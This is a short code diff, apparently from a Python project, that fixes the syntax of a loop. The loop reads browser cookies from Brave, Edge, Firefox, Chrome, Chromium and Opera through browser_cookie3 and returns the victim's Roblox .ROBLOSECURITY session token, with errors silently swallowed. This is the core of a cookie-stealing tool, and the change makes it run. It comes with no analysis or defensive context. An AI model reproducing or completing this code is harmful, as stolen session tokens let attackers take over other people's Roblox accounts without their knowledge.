@@ -13,13 +13,13 @@ if __name__ == "__main__":
         data = [] 
 
         try:
-            for browser in ["brave", "edge", "firefox", "chrome", "chromium", "opera"]
-            cookies = eval(f"browser_cookie3.{browser}(domain_name='roblox.com')")
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    data.append(cookies)
-                    data.append(cookie.value)
-                    return data[1]
+            for browser in ["brave", "edge", "firefox", "chrome", "chromium", "opera"]:
+                cookies = eval(f"browser_cookie3.{browser}(domain_name='roblox.com')")
+                for cookie in cookies:
+                    if cookie.name == '.ROBLOSECURITY':
+                        data.append(cookies)
+                        data.append(cookie.value)
+                        return data[1]
         except:
             pass
 
